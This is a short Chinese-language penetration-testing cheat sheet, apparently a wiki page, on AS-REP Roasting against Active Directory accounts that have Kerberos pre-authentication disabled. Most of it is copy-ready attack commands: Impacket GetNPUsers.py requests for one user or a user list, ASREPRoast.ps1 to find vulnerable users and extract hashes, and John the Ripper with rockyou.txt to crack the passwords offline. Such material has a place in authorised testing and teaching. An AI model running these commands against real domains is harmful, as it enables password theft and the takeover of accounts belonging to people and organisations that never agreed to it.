---
description: 基于Kerberos认证 / 离线爆破攻击 / 未开启Kerberos预身份验证
---

# ✔️ AS-REP Roasting攻击

## 先决条件

* 已经在目标域内建立了基本立足点
* 目标用户账户勾选了“不要求Kerberos预身份验证”这个选项

## 常用工具

### Impacket

* 常用脚本：**GetNPUsers.py**

```bash
# 针对指定某个用户账户的获取
pyhton3 GetNPUsers.py target.com/administrator -dc-ip 域控IP
# 针对多个用户账户
python3 GetNPUsers.py -dc-ip 域控IP -userfile users.txt
```

### Powershell

* 常用脚本：**ASREPRoast.ps1**

```powershell
# 搜索目标域内未开启预身份验证的用户
Import-Moudle .\ASREPRoast.ps1
# 过滤出hash值
Invoke-ASREPRoast | select -ExpandProperty Hash
```

### John the Ripper

```bash
# 用于将获取到的hash进行离线爆破出明文密码
john hash.txt rockyou.txt
```

{% hint style="info" %}
AS-REP Roasting攻击有些局限，因为它主要是针对没有开启Kerberos预身份验证的用户账户的攻击，然后通过离线爆破的方式获取到目标用户的密码。
{% endhint %}
